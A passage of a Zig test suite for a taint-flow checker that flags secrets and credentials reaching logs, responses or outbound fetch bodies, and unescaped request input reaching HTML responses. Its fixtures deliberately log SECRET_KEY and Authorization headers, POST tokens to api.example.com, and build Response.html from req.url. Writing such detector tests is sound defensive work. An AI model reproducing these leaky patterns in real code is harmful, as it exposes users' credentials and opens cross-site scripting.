
    const handler_verifier = @import("handler_verifier.zig");
    const handler_fn = handler_verifier.findHandlerFunction(ir_view, root) orelse
        return error.HandlerNotFound;

    var checker = FlowChecker.init(allocator, ir_view, &atoms);
    defer checker.deinit();
    _ = try checker.check(handler_fn);

    var count: usize = 0;
    var help: []const u8 = "";
    for (checker.getDiagnostics()) |diag| {
        if (diag.kind != kind) continue;
        if (count == 0) {
            const text = diag.help orelse "";
            const n = @min(text.len, help_buf.len);
            @memcpy(help_buf[0..n], text[0..n]);
            help = help_buf[0..n];
        }
        count += 1;
    }
    return .{ .properties = checker.getProperties(), .count = count, .help = help };
}

test "FlowChecker reports a secret logged inside a called helper, call-sensitively" {
    var buf: [512]u8 = undefined;

    // Direct form: the secret logged in the handler body is refused, and its
    // help text is the plain text with no call chain.
    const direct =
        \\import { env } from "zttp:env";
        \\function handler(req) {
        \\  console.log(env("SECRET_KEY"));
        \\  return Response.json({ ok: true });
        \\}
    ;
    const direct_report = try runFlowDiagnostics(std.testing.allocator, direct, .secret_in_log, &buf);
    try std.testing.expectEqual(@as(usize, 1), direct_report.count);
    try std.testing.expect(!direct_report.properties.no_secret_leakage);
    try std.testing.expectEqualStrings("env vars with sensitive names must not be logged", direct_report.help);

    // Routed form: the same log, reached through a top-level helper.
    const routed =
        \\import { env } from "zttp:env";
        \\function note(t) {
        \\  console.log(t);
        \\  return 1;
        \\}
        \\function handler(req) {
        \\  const n = note(env("SECRET_KEY"));
        \\  return Response.json({ n: n });
        \\}
    ;
    const routed_report = try runFlowDiagnostics(std.testing.allocator, routed, .secret_in_log, &buf);
    try std.testing.expectEqual(@as(usize, 1), routed_report.count);
    try std.testing.expect(!routed_report.properties.no_secret_leakage);
    try std.testing.expect(std.mem.startsWith(u8, routed_report.help, "env vars with sensitive names must not be logged"));
    try std.testing.expect(std.mem.indexOf(u8, routed_report.help, "line 7") != null);

    // The same helper called with a clean literal reports nothing.
    const clean =
        \\import { env } from "zttp:env";
        \\function note(t) {
        \\  console.log(t);
        \\  return 1;
        \\}
        \\function handler(req) {
        \\  const n = note("ok");
        \\  return Response.json({ n: n });
        \\}
    ;
    const clean_report = try runFlowDiagnostics(std.testing.allocator, clean, .secret_in_log, &buf);
    try std.testing.expectEqual(@as(usize, 0), clean_report.count);
    try std.testing.expect(clean_report.properties.no_secret_leakage);
}

test "FlowChecker reports an egress body secret inside a nested arrow" {
    var buf: [512]u8 = undefined;
    const source =
        \\import { env } from "zttp:env";
        \\import { fetch } from "zttp:fetch";
        \\function handler(req) {
        \\  const send = (t) => {
        \\    fetch("https://api.example.com/collect", { body: t });
        \\    return 1;
        \\  };
        \\  const n = send(env("SECRET_KEY"));
        \\  return Response.json({ n: n });
        \\}
    ;
    const report = try runFlowDiagnostics(std.testing.allocator, source, .secret_in_egress_body, &buf);
    try std.testing.expectEqual(@as(usize, 1), report.count);
    try std.testing.expect(!report.properties.no_secret_leakage);
}

test "FlowChecker reports a credential logged inside a helper" {
    var buf: [512]u8 = undefined;
    const source =
        \\function show(t) {
        \\  console.log(t);
        \\  return 1;
        \\}
        \\function handler(req) {
        \\  const n = show(req.headers.authorization);
        \\  return Response.json({ n: n });
        \\}
    ;
    const report = try runFlowDiagnostics(std.testing.allocator, source, .credential_in_log, &buf);
    try std.testing.expectEqual(@as(usize, 1), report.count);
    try std.testing.expect(!report.properties.no_credential_leakage);
}

test "FlowChecker reports a credential response built inside a helper and discarded" {
    var buf: [512]u8 = undefined;
    const source =
        \\function wrap(t) {
        \\  return Response.json({ t: t });
        \\}
        \\function handler(req) {
        \\  return wrap(req.headers.authorization);
        \\}
    ;
    const report = try runFlowDiagnostics(std.testing.allocator, source, .credential_in_response, &buf);
    try std.testing.expect(report.count >= 1);
    try std.testing.expect(!report.properties.no_credential_leakage);
}

test "FlowChecker reports a secret logged by an array method callback" {
    var buf: [512]u8 = undefined;
    const leaking =
        \\import { env } from "zttp:env";
        \\function handler(req) {
        \\  const s = env("SECRET_KEY");
        \\  const out = [s].map((x) => {
        \\    console.log(x);
        \\    return 1;
        \\  });
        \\  return Response.json({ n: out.length });
        \\}
    ;
    const leaking_report = try runFlowDiagnostics(std.testing.allocator, leaking, .secret_in_log, &buf);
    try std.testing.expectEqual(@as(usize, 1), leaking_report.count);
    try std.testing.expect(!leaking_report.properties.no_secret_leakage);

    // A clean receiver leaves the same callback silent, so the binding is
    // taken from the receiver and not from the callback's own text.
    const clean =
        \\import { env } from "zttp:env";
        \\function handler(req) {
        \\  const s = env("SECRET_KEY");
        \\  const out = ["a"].map((x) => {
        \\    console.log(x);
        \\    return s.length;
        \\  });
        \\  return Response.json({ n: out.length });
        \\}
    ;
    const clean_report = try runFlowDiagnostics(std.testing.allocator, clean, .secret_in_log, &buf);
    try std.testing.expectEqual(@as(usize, 0), clean_report.count);
}

test "FlowChecker reports unvalidated input built into Response.html inside a helper" {
    var buf: [512]u8 = undefined;
    const direct =
        \\function handler(req) { return Response.html(req.url); }
    ;
    const direct_report = try runFlowDiagnostics(std.testing.allocator, direct, .unvalidated_input_in_egress, &buf);
    try std.testing.expectEqual(@as(usize, 1), direct_report.count);
    try std.testing.expect(!direct_report.properties.injection_safe);

    const routed =
        \\function page(t) { return Response.html(t); }
        \\function handler(req) { return page(req.url); }
    ;
    const routed_report = try runFlowDiagnostics(std.testing.allocator, routed, .unvalidated_input_in_egress, &buf);
    try std.testing.expectEqual(@as(usize, 1), routed_report.count);
    try std.testing.expect(!routed_report.properties.injection_safe);

    const clean =
        \\function page(t) { return Response.html(t); }
        \\function handler(req) { return page("<p>ok</p>"); }
    ;
    const clean_report = try runFlowDiagnostics(std.testing.allocator, clean, .unvalidated_input_in_egress, &buf);
    try std.testing.expectEqual(@as(usize, 0), clean_report.count);
    try std.testing.expect(clean_report.properties.injection_safe);
}

test "FlowChecker reports callee-built HTML only when it reaches the response (F4)" {
    var buf: [512]u8 = undefined;

    // Controls: a callee builds HTML from input and the caller discards it, or
    // calls the helper with a literal. Nothing unvalidated reaches the response,
    // so `injection_safe` holds and nothing is reported.
    const discarded_map =
        \\function handler(req) {
        \\  const s = req.url;
        \\  const pages = [s].map((x) => { return Response.html(x); });
        \\  return Response.json({ ok: 1 });
        \\}
    ;
    const discarded_map_report = try runFlowDiagnostics(std.testing.allocator, discarded_map, .unvalidated_input_in_egress, &buf);
    try std.testing.expectEqual(@as(usize, 0), discarded_map_report.count);
    try std.testing.expect(discarded_map_report.properties.injection_safe);

    const discarded_call =
        \\function page(t) { return Response.html(t); }
        \\function handler(req) {
        \\  const first = page(req.url);
        \\  return page("<p>ok</p>");
        \\}
    ;
    const discarded_call_report = try runFlowDiagnostics(std.testing.allocator, discarded_call, .unvalidated_input_in_egress, &buf);
    try std.testing.expectEqual(@as(usize, 0), discarded_call_report.count);
    try std.testing.expect(discarded_call_report.properties.injection_safe);

    // A validated value built into HTML stays clean through a helper.
    const validated =
        \\import { escapeHtml } from "zttp:text";
        \\function page(t) { return Response.html(escapeHtml(t)); }
        \\function handler(req) { return page(req.url); }
    ;
    const validated_report = try runFlowDiagnostics(std.testing.allocator, validated, .unvalidated_input_in_egress, &buf);
    try std.testing.expectEqual(@as(usize, 0), validated_report.count);
    try std.testing.expect(validated_report.properties.injection_safe);

    // The fact is followed through every shape a callee's result takes on its
    // way to the response: a binding, a ternary arm, a pass-through helper, and
    // a field of the response payload. Each is refused with the XSS message.
    const shapes = [_][]const u8{
        \\function page(t) { return Response.html(t); }
        \\function handler(req) {
        \\  const r = page(req.url);
        \\  return r;
        \\}
        ,
        \\function page(t) { return Response.html(t); }
        \\function handler(req) {
        \\  return req.method === "GET" ? page(req.url) : Response.json({ ok: 1 });
        \\}
        ,
        \\function page(t) { return Response.html(t); }
        \\function wrap(r) { return r; }
        \\function handler(req) { return wrap(page(req.url)); }
        ,
        \\function page(t) { return Response.html(t); }
        \\function handler(req) { return Response.json({ page: page(req.url) }); }
        ,
        \\function handler(req) {
        \\  const pages = [req.url].map((x) => { return Response.html(x); });
        \\  return Response.json({ pages: pages });
        \\}
        ,
    };
    for (shapes) |source| {
        const report = try runFlowDiagnostics(std.testing.allocator, source, .unvalidated_input_in_egress, &buf);
        try std.testing.expect(report.count >= 1);
        try std.testing.expect(!report.properties.injection_safe);
    }

    // The diagnostic is reported once, at the `Response.html` call in the
    // callee, with its message unchanged.
    const routed =
        \\function page(t) { return Response.html(t); }
        \\function handler(req) { return page(req.url); }
    ;
    const routed_report = try runFlowDiagnostics(std.testing.allocator, routed, .unvalidated_input_in_egress, &buf);
    try std.testing.expectEqual(@as(usize, 1), routed_report.count);
}

test "FlowChecker checks sinks on return paths, concise bodies, and nested expressions (F5)" {
    const head =
        \\import { env } from "zttp:env";
        \\import { fetch } from "zttp:fetch";
        \\import { logInfo } from "zttp:log";
        \\
    ;
    const Case = struct { name: []const u8, source: []const u8 };

    // Each source leaks a secret through a sink that the walk used to skip.
    // The direct form sits in the handler; the routed forms put the same sink
    // in a callee. All of them must lose `no_secret_leakage`.
    const leaking = [_]Case{
        .{ .name = "return path, direct", .source = head ++
            \\function handler(req) {
            \\  const t = env("API_TOKEN") ?? "";
            \\  return fetch("https://api.example.com/x", { method: "POST", body: t });
            \\}
        },
        .{ .name = "return path, field of the response", .source = head ++
            \\function handler(req) {
            \\  const t = env("API_TOKEN") ?? "";
            \\  return Response.json({ status: fetch("https://api.example.com/x", { method: "POST", body: t }).status });
            \\}
        },
        .{ .name = "return path, in a callee", .source = head ++
            \\function send(x) { return fetch("https://api.example.com/x", { method: "POST", body: x }); }
            \\function handler(req) {
            \\  const t = env("API_TOKEN") ?? "";
            \\  const r = send(t);
            \\  return Response.json({ ok: 1 });
            \\}
        },
        .{ .name = "concise body, in a callee", .source = head ++
            \\function handler(req) {
            \\  const t = env("API_TOKEN") ?? "";
            \\  const inner = (x) => logInfo(x, { n: 1 });
            \\  const n = inner(t);
            \\  return Response.json({ ok: 1 });
            \\}
        },
        .{ .name = "concise body, fetch field", .source = head ++
            \\function handler(req) {
            \\  const t = env("API_TOKEN") ?? "";
            \\  const inner = (x) => fetch("https://api.example.com/x", { method: "POST", body: x }).status;
            \\  const n = inner(t);
            \\  return Response.json({ ok: 1 });
            \\}
        },
        .{ .name = "concise body, array callback", .source = head ++
            \\function handler(req) {
            \\  const t = env("API_TOKEN") ?? "";
            \\  const n = [t].map((x) => fetch("https://api.example.com/x", { method: "POST", body: x }).status);
            \\  return Response.json({ ok: 1 });
            \\}
        },
        .{ .name = "nested in an array", .source = head ++
            \\function handler(req) {
            \\  const t = env("API_TOKEN") ?? "";
            \\  const rs = [fetch("https://api.example.com/x", { method: "POST", body: t })];
            \\  return Response.json({ ok: 1 });
            \\}
        },
        .{ .name = "nested in an object field", .source = head ++
            \\function handler(req) {
            \\  const t = env("API_TOKEN") ?? "";
            \\  const o = { r: fetch("https://api.example.com/x", { method: "POST", body: t }) };
            \\  return Response.json({ ok: 1 });
            \\}
        },
        .{ .name = "nested in a ternary arm", .source = head ++
            \\function handler(req) {
            \\  const t = env("API_TOKEN") ?? "";
            \\  const r = req.method === "GET" ? fetch("https://api.example.com/x", { method: "POST", body: t }) : 0;
            \\  return Response.json({ ok: 1 });
            \\}
        },
        .{ .name = "nested in a call argument", .source = head ++
            \\function handler(req) {
            \\  const t = env("API_TOKEN") ?? "";
            \\  logInfo("sent", { status: fetch("https://api.example.com/x", { method: "POST", body: t }).status });
            \\  return Response.json({ ok: 1 });
            \\}
        },
        .{ .name = "nested in an assignment statement", .source = head ++
            \\function handler(req) {
            \\  const t = env("API_TOKEN") ?? "";
            \\  let r = 0;
            \\  r = fetch("https://api.example.com/x", { method: "POST", body: t });
            \\  return Response.json({ ok: 1 });
            \\}
        },
        .{ .name = "nested in an if condition", .source = head ++
            \\function handler(req) {
            \\  const t = env("API_TOKEN") ?? "";
            \\  if (fetch("https://api.example.com/x", { method: "POST", body: t }).ok) return Response.json({ ok: 1 });
            \\  return Response.json({ ok: 0 });
            \\}
        },
        .{ .name = "nested in a callee expression", .source = head ++
            \\function send(x) {
            \\  const rs = [fetch("https://api.example.com/x", { method: "POST", body: x })];
            \\  return 1;
            \\}
            \\function handler(req) {
            \\  const t = env("API_TOKEN") ?? "";
            \\  const n = send(t);
            \\  return Response.json({ ok: 1 });
            \\}
        },
    };
    for (leaking) |case| {
        errdefer std.debug.print("case still proven: {s}\n", .{case.name});
        const properties = try runFlowProperties(std.testing.allocator, case.source);
        try std.testing.expect(!properties.no_secret_leakage);
    }

    // Controls: the same shapes with a literal where the secret was.
    const clean = [_]Case{
        .{ .name = "return path", .source = head ++
            \\function send(x) { return fetch("https://api.example.com/x", { method: "POST", body: x }); }
            \\function handler(req) {
            \\  const t = env("API_TOKEN") ?? "";
            \\  const r = send("hello");
            \\  return Response.json({ ok: 1 });
            \\}
        },
        .{ .name = "concise body", .source = head ++
            \\function handler(req) {
            \\  const t = env("API_TOKEN") ?? "";
            \\  const inner = (x) => logInfo(x, { n: 1 });
            \\  const n = inner("hello");
            \\  return Response.json({ ok: 1 });
            \\}
        },
        .{ .name = "nested", .source = head ++
            \\function handler(req) {
            \\  const t = env("API_TOKEN") ?? "";
            \\  const rs = [fetch("https://api.example.com/x", { method: "POST", body: "hello" })];
            \\  return Response.json({ ok: 1 });
            \\}
        },
    };
    for (clean) |case| {
        errdefer std.debug.print("case wrongly refused: {s}\n", .{case.name});
        const properties = try runFlowProperties(std.testing.allocator, case.source);
        try std.testing.expect(properties.no_secret_leakage);
    }
}

test "FlowChecker reports a nested sink once, with the same text as the statement form (F5)" {
    var buf: [512]u8 = undefined;
    const statement =
        \\import { env } from "zttp:env";
        \\import { fetch } from "zttp:fetch";
        \\function handler(req) {
        \\  const t = env("API_TOKEN") ?? "";
        \\  fetch("https://api.example.com/x", { method: "POST", body: t });
        \\  return Response.json({ ok: 1 });
        \\}
    ;
    const nested =
        \\import { env } from "zttp:env";
        \\import { fetch } from "zttp:fetch";
        \\function handler(req) {
        \\  const t = env("API_TOKEN") ?? "";
        \\  return Response.json({ s: fetch("https://api.example.com/x", { method: "POST", body: t }).status });
        \\}
    ;
    const statement_report = try runFlowDiagnostics(std.testing.allocator, statement, .secret_in_egress_body, &buf);
    try std.testing.expectEqual(@as(usize, 1), statement_report.count);
    var nested_buf: [512]u8 = undefined;
    const nested_report = try runFlowDiagnostics(std.testing.allocator, nested, .secret_in_egress_body, &nested_buf);
    try std.testing.expectEqual(@as(usize, 1), nested_report.count);
    try std.testing.expectEqualStrings(statement_report.help, nested_report.help);
}

test "FlowChecker labels credential reads on any binding that carries the request (F6)" {
    const Case = struct { name: []const u8, source: []const u8 };

    // The direct form: the handler's own request parameter. Refused today.
    const direct =
        \\function handler(req) {
        \\  console.log(req.headers["authorization"]);
        \\  return Response.json({ ok: 1 });
        \\}
    ;
    const direct_properties = try runFlowProperties(std.testing.allocator, direct);
    try std.testing.expect(!direct_properties.no_credential_leakage);

    // The routed forms: the same read through a binding other than the
    // handler's parameter. Each must lose `no_credential_leakage`.
    const leaking = [_]Case{
        .{ .name = "parameter bound to the request", .source =
        \\function leak(r) {
        \\  console.log(r.headers["authorization"]);
        \\  return 1;
        \\}
        \\function handler(req) {
        \\  const n = leak(req);
        \\  return Response.json({ ok: 1 });
        \\}
        },
        .{ .name = "dot read in a helper that responds", .source =
        \\function show(r) { return Response.json({ k: r.headers.authorization }); }
        \\function handler(req) { return show(req); }
        },
        .{ .name = "headers.get in a helper", .source =
        \\function leak(r) {
        \\  console.log(r.headers.get("authorization"));
        \\  return 1;
        \\}
        \\function handler(req) {
        \\  const n = leak(req);
        \\  return Response.json({ ok: 1 });
        \\}
        },
        .{ .name = "request passed through two helpers", .source =
        \\function leak(r) {
        \\  console.log(r.headers["authorization"]);
        \\  return 1;
        \\}
        \\function outer(q) { return leak(q); }
        \\function handler(req) {
        \\  const n = outer(req);
        \\  return Response.json({ ok: 1 });
        \\}
        },
        .{ .name = "const alias of the request", .source =
        \\function handler(req) {
        \\  const r = req;
        \\  console.log(r.headers["authorization"]);
        \\  return Response.json({ ok: 1 });
        \\}
        },
        .{ .name = "const alias of the headers", .source =
        \\function handler(req) {
        \\  const h = req.headers;
        \\  console.log(h["authorization"]);
        \\  return Response.json({ ok: 1 });
        \\}
        },
        .{ .name = "headers passed to a helper", .source =
        \\function leak(h) {
        \\  console.log(h.authorization);
        \\  return 1;
        \\}
        \\function handler(req) {
        \\  const n = leak(req.headers);
        \\  return Response.json({ ok: 1 });
        \\}
        },
        .{ .name = "callback receives the credential", .source =
        \\function apply(r, f) {
        \\  const t = r.headers["authorization"] ?? "";
        \\  return f(t);
        \\}
        \\function handler(req) {
        \\  const n = apply(req, (x) => { console.log(x); return 1; });
        \\  return Response.json({ ok: 1 });
        \\}
        },
        .{ .name = "recursion", .source =
        \\function rec(r, x, k) {
        \\  if (k <= 0) { return Response.json({ k: x }); }
        \\  const t = r.headers["authorization"] ?? "";
        \\  return rec(r, t, k - 1);
        \\}
        \\function handler(req) { return rec(req, "hello", 1); }
        },
    };
    for (leaking) |case| {
        errdefer std.debug.print("case still proven: {s}\n", .{case.name});
        const properties = try runFlowProperties(std.testing.allocator, case.source);
        try std.testing.expect(!properties.no_credential_leakage);
    }

    // Controls: a header read that is not the credential, and an object that
    // happens to have a `headers` field but is not the request, stay clean.
    const clean = [_]Case{
        .{ .name = "another header of the request", .source =
        \\function show(r) { console.log(r.headers["x-trace-id"]); return 1; }
        \\function handler(req) {
        \\  const n = show(req);
        \\  return Response.json({ ok: 1 });
        \\}
        },
        .{ .name = "an object with a headers field", .source =
        \\function show(o) { console.log(o.headers["authorization"]); return 1; }
        \\function handler(req) {
        \\  const n = show({ headers: { authorization: "public" } });
        \\  return Response.json({ ok: 1 });
        \\}
        },
        .{ .name = "an alias of such an object", .source =
        \\function handler(req) {
        \\  const o = { headers: { authorization: "public" } };
        \\  const r = o;
        \\  console.log(r.headers["authorization"]);
        \\  return Response.json({ ok: 1 });
        \\}
        },
        .{ .name = "a helper called with something other than the request", .source =
        \\function show(r) { console.log(r.headers["authorization"]); return 1; }
        \\function handler(req) {
        \\  const n = show({ headers: { authorization: "public" } });
        \\  return Response.json({ ok: 1 });
        \\}
        },
    };
    for (clean) |case| {
        errdefer std.debug.print("case wrongly refused: {s}\n", .{case.name});
        const properties = try runFlowProperties(std.testing.allocator, case.source);
        try std.testing.expect(properties.no_credential_leakage);
    }
}

test "FlowChecker re-walks a callee without the labels an earlier call bound" {
    // `id` is walked first with a secret, then with a literal. Its `y` must
    // not keep the secret into the second walk, or `shout` logs a clean value
    // as a secret.
    const source =
        \\import { env } from "zttp:env";
        \\function id(x) {
        \\  const y = x;
        \\  return y;
        \\}
        \\function shout(x) {
        \\  console.log(x);
        \\  return 1;
        \\}
        \\function handler(req) {
        \\  const a = id(env("SECRET_KEY"));
        \\  const b = id("hello");
        \\  const n = shout(b);
        \\  return Response.json({ n: n });
        \\}
    ;
    try std.testing.expect((try runFlowProperties(std.testing.allocator, source)).no_secret_leakage);

    // The control: the secret through the same path is still refused.
    const leaking =
        \\import { env } from "zttp:env";
        \\function id(x) {
        \\  const y = x;
        \\  return y;
        \\}
        \\function shout(x) {
        \\  console.log(x);
        \\  return 1;
        \\}
        \\function handler(req) {
        \\  const b = id("hello");
        \\  const a = id(env("SECRET_KEY"));
        \\  const n = shout(a);
        \\  return Response.json({ n: n });
        \\}
    ;
    try std.testing.expect(!(try runFlowProperties(std.testing.allocator, leaking)).no_secret_leakage);
}

test "FlowChecker carries labels on a module-level declaration" {
    var buf: [512]u8 = undefined;

    // The handler returns a secret held by a module-level constant.
    const returned =
        \\import { env } from "zttp:env";
        \\const token = env("SECRET_KEY") ?? "";
        \\function handler(req) {
        \\  return Response.json({ k: token });
        \\}
    ;
    const returned_report = try runFlowDiagnostics(std.testing.allocator, returned, .secret_in_response, &buf);
    try std.testing.expectEqual(@as(usize, 1), returned_report.count);
    try std.testing.expect(!returned_report.properties.no_secret_leakage);

    // The same constant declared after the handler is read the same way.
    const declared_later =
        \\import { env } from "zttp:env";
        \\function handler(req) {
        \\  return Response.json({ k: token });
        \\}
        \\const token = env("SECRET_KEY") ?? "";
    ;
    try std.testing.expect(!(try runFlowProperties(std.testing.allocator, declared_later)).no_secret_leakage);

    // A helper logs the constant.
    const logged =
        \\import { env } from "zttp:env";
        \\const token = env("SECRET_KEY") ?? "";
        \\function audit() {
        \\  console.log(token);
        \\  return 1;
        \\}
        \\function handler(req) {
        \\  const n = audit();
        \\  return Response.json({ n: n });
        \\}
    ;
    const logged_report = try runFlowDiagnostics(std.testing.allocator, logged, .secret_in_log, &buf);
    try std.testing.expectEqual(@as(usize, 1), logged_report.count);
    try std.testing.expect(!logged_report.properties.no_secret_leakage);

    // A module-level initializer is itself a sink at load time.
    const initializer_sink =
        \\import { env } from "zttp:env";
        \\const logged = console.log(env("SECRET_KEY"));
        \\function handler(req) {
        \\  return Response.json({ ok: true });
        \\}
    ;
    try std.testing.expect(!(try runFlowProperties(std.testing.allocator, initializer_sink)).no_secret_leakage);

    // A secret reached through a second module-level constant.
    const chained =
        \\import { env } from "zttp:env";
        \\const token = env("SECRET_KEY") ?? "";
        \\const header = token;
        \\function handler(req) {
        \\  return Response.json({ k: header });
        \\}
    ;
    try std.testing.expect(!(try runFlowProperties(std.testing.allocator, chained)).no_secret_leakage);
}

test "FlowChecker keeps a property for a module-level clean constant or function" {
    // Control: a module-level constant that holds no secret keeps the property.
    const clean =
        \\import { env } from "zttp:env";
        \\const region = env("REGION") ?? "";
        \\function handler(req) {
        \\  return Response.json({ region: region });
        \\}
    ;
    try std.testing.expect((try runFlowProperties(std.testing.allocator, clean)).no_secret_leakage);

    // A module-level function named in a route table is a function value, not
    // a datum without a label: the table and the route keep the property.
    const routed =
        \\import { routerMatch } from "zttp:router";
        \\function show(req) { return Response.json({ ok: true }); }
        \\const routes = { "GET /show": show };
        \\function handler(req) {
        \\  const found = routerMatch(routes, req);
        \\  if (found === undefined) return Response.json({ error: "not found" });
        \\  return found.handler(req);
        \\}
    ;
    try std.testing.expect((try runFlowProperties(std.testing.allocator, routed)).no_secret_leakage);

    // A function declaration or a function-valued constant, read as a value,
    // holds no datum that lacks a label.
    const function_valued =
        \\function twice(n) { return n + n; }
        \\const thrice = (n) => n + n + n;
        \\function handler(req) {
        \\  const fns = [twice, thrice];
        \\  return Response.json({ n: fns.length });
        \\}
    ;
    try std.testing.expect((try runFlowProperties(std.testing.allocator, function_valued)).no_secret_leakage);

    // An imported name read as a value likewise carries no unlabeled datum.
    const imported_value =
        \\import { env } from "zttp:env";
        \\function handler(req) {
        \\  const fns = [env];
        \\  return Response.json({ n: fns.length });
        \\}
    ;
    try std.testing.expect((try runFlowProperties(std.testing.allocator, imported_value)).no_secret_leakage);

    // A let without an initializer starts empty.
    const uninitialized =
        \\let count;
        \\function handler(req) {
        \\  return Response.json({ n: count });
        \\}
    ;
    try std.testing.expect((try runFlowProperties(std.testing.allocator, uninitialized)).no_secret_leakage);
}

test "FlowChecker resolves a captured value to the declaration it names" {
    var buf: [512]u8 = undefined;

    // A closure builds a response from a captured secret.
    const returned =
        \\import { env } from "zttp:env";
        \\function handler(req) {
        \\  const token = env("SECRET_KEY") ?? "";
        \\  const inner = () => {
        \\    return Response.json({ k: token });
        \\  };
        \\  return inner();
        \\}
    ;
    try std.testing.expect(!(try runFlowProperties(std.testing.allocator, returned)).no_secret_leakage);

    // A nested arrow logs a captured secret.
    const logged =
        \\import { env } from "zttp:env";
        \\function handler(req) {
        \\  const token = env("SECRET_KEY") ?? "";
        \\  const note = () => {
        \\    console.log(token);
        \\    return 1;
        \\  };
        \\  const n = note();
        \\  return Response.json({ n: n });
        \\}
    ;
    const logged_report = try runFlowDiagnostics(std.testing.allocator, logged, .secret_in_log, &buf);
    try std.testing.expectEqual(@as(usize, 1), logged_report.count);
    try std.testing.expect(!logged_report.properties.no_secret_leakage);

    // A nested function declaration reads a parameter of its enclosing function.
    const param_capture =
        \\import { env } from "zttp:env";
        \\function relay(token) {
        \\  function inner() {
        \\    console.log(token);
        \\    return 1;
        \\  }
        \\  return inner();
        \\}
        \\function handler(req) {
        \\  const n = relay(env("SECRET_KEY") ?? "");
        \\  return Response.json({ n: n });
        \\}
    ;
    try std.testing.expect(!(try runFlowProperties(std.testing.allocator, param_capture)).no_secret_leakage);

    // Two levels of nesting reach the same declaration.
    const two_levels =
        \\import { env } from "zttp:env";
        \\function handler(req) {
        \\  const token = env("SECRET_KEY") ?? "";
        \\  const outer = () => {
        \\    const inner = () => {
        \\      console.log(token);
        \\      return 1;
        \\    };
        \\    return inner();
        \\  };
        \\  const n = outer();
        \\  return Response.json({ n: n });
        \\}
    ;
    try std.testing.expect(!(try runFlowProperties(std.testing.allocator, two_levels)).no_secret_leakage);

    // A closure that a module calls later still reads what it captured.
    const parallel_callback =
        \\import { env } from "zttp:env";
        \\import { parallel } from "zttp:io";
        \\function handler(req) {
        \\  const token = env("SECRET_KEY") ?? "";
        \\  const out = parallel([() => { console.log(token); return 1; }]);
        \\  return Response.json({ ok: 1 });
        \\}
    ;
    try std.testing.expect(!(try runFlowProperties(std.testing.allocator, parallel_callback)).no_secret_leakage);

    // A captured module-level secret resolves through its global declaration.
    const module_level =
        \\import { env } from "zttp:env";
        \\const token = env("SECRET_KEY") ?? "";
        \\function handler(req) {
        \\  const inner = () => {
        \\    return Response.json({ k: token });
        \\  };
        \\  return inner();
        \\}
    ;
    try std.testing.expect(!(try runFlowProperties(std.testing.allocator, module_level)).no_secret_leakage);
}

test "FlowChecker keeps a property for a captured value that holds no secret" {
    // Control: the captured value is clean.
    const clean =
        \\import { env } from "zttp:env";
        \\function handler(req) {
        \\  const region = env("REGION") ?? "";
        \\  const inner = () => {
        \\    console.log(region);
        \\    return Response.json({ r: region });
        \\  };
        \\  return inner();
        \\}
    ;
    try std.testing.expect((try runFlowProperties(std.testing.allocator, clean)).no_secret_leakage);

    // Name collision: the helper logs its own clean x, and the handler's secret
    // x is only measured. A union by name would refuse this.
    const collision =
        \\import { env } from "zttp:env";
        \\function helperA() {
        \\  const x = "clean";
        \\  const inner = () => {
        \\    console.log(x);
        \\    return 1;
        \\  };
        \\  return inner();
        \\}
        \\function handler(req) {
        \\  const x = env("SECRET_KEY") ?? "";
        \\  const n = helperA();
        \\  const m = x.length;
        \\  return Response.json({ ok: 1 });
        \\}
    ;
    try std.testing.expect((try runFlowProperties(std.testing.allocator, collision)).no_secret_leakage);

    // Shadowing: the closure captures the function-level x, not the x of a
    // block that has ended.
    const shadowed =
        \\import { env } from "zttp:env";
        \\function handler(req) {
        \\  if (req.method === "GET") {
        \\    const x = env("SECRET_KEY") ?? "";
        \\    const m = x.length;
        \\  }
        \\  const x = "clean";
        \\  const show = () => {
        \\    return Response.json({ k: x });
        \\  };
        \\  return show();
        \\}
    ;
    try std.testing.expect((try runFlowProperties(std.testing.allocator, shadowed)).no_secret_leakage);

    // The closure is declared where a parameter of the same name is clean.
    const param_clean =
        \\import { env } from "zttp:env";
        \\function show(token) {
        \\  const inner = () => {
        \\    return Response.json({ k: token });
        \\  };
        \\  return inner();
        \\}
        \\function handler(req) {
        \\  const token = env("SECRET_KEY") ?? "";
        \\  const m = token.length;
        \\  return show("clean");
        \\}
    ;
    try std.testing.expect((try runFlowProperties(std.testing.allocator, param_clean)).no_secret_leakage);
}

test "FlowChecker carries an operand's labels through a unary operator" {
    // `getOptValue` on a unary node reads the operator code, not the operand,
    // so the operand's labels were dropped (and a module-level `typeof n`
    // walked an unrelated node until the stack ran out).
    const negated =
        \\import { env } from "zttp:env";
        \\function handler(req) {
        \\  const t = !(env("SECRET_KEY") ?? "");
        \\  return Response.json({ t: t });
        \\}
    ;
    try std.testing.expect(!(try runFlowProperties(std.testing.allocator, negated)).no_secret_leakage);

    const typed_at_module_level =
        \\const n = 1;
        \\const same = typeof n === "number";
        \\function handler(req) {
        \\  return Response.json({ same: same });
        \\}
    ;
    try std.testing.expect((try runFlowProperties(std.testing.allocator, typed_at_module_level)).no_secret_leakage);
}

test "FlowChecker fails closed on a discarded method of a record a function returned" {
    // Bound to the response, the result carries the argument's secret, so the
    // leak is refused there already.
    const bound =
        \\import { env } from "zttp:env";
        \\function makeOps() {
        \\  return { run: (s) => { console.log(s); return 1; } };
        \\}
        \\function handler(req) {
        \\  const ops = makeOps();
        \\  const n = ops.run(env("SECRET_KEY"));
        \\  return Response.json({ n: n });
        \\}
    ;
    try std.testing.expect(!(try runFlowProperties(std.testing.allocator, bound)).no_secret_leakage);

    // Discarded, the closure's log is the only leak, and the walk cannot
    // resolve `run` through the returned record, so the property is cleared.
    const discarded =
        \\import { env } from "zttp:env";
        \\function makeOps() {
        \\  return { run: (s) => { console.log(s); return 1; } };
        \\}
        \\function handler(req) {
        \\  const ops = makeOps();
        \\  ops.run(env("SECRET_KEY"));
        \\  return Response.json({ ok: true });
        \\}
    ;
    try std.testing.expect(!(try runFlowProperties(std.testing.allocator, discarded)).no_secret_leakage);

    // A builtin method name on a value of unknown type keeps the property.
    const builtin =
        \\function handler(req) {
        \\  const parts = req.url.split("/");
        \\  parts.join("-");
        \\  return Response.json({ ok: true });
        \\}
    ;
    try std.testing.expect((try runFlowProperties(std.testing.allocator, builtin)).no_secret_leakage);
}

test "FlowChecker fails closed on a discarded call beyond the summary depth cap" {
    var buf: [512]u8 = undefined;
    // Nine helpers: the ninth logs, one past `max_summary_depth`. The result is
    // discarded, so only the property can record that the walk did not reach
    // the log.
    const leaking =
        \\import { env } from "zttp:env";
        \\function h9(x) { console.log(x); return 1; }
        \\function h8(x) { return h9(x); }
        \\function h7(x) { return h8(x); }
        \\function h6(x) { return h7(x); }
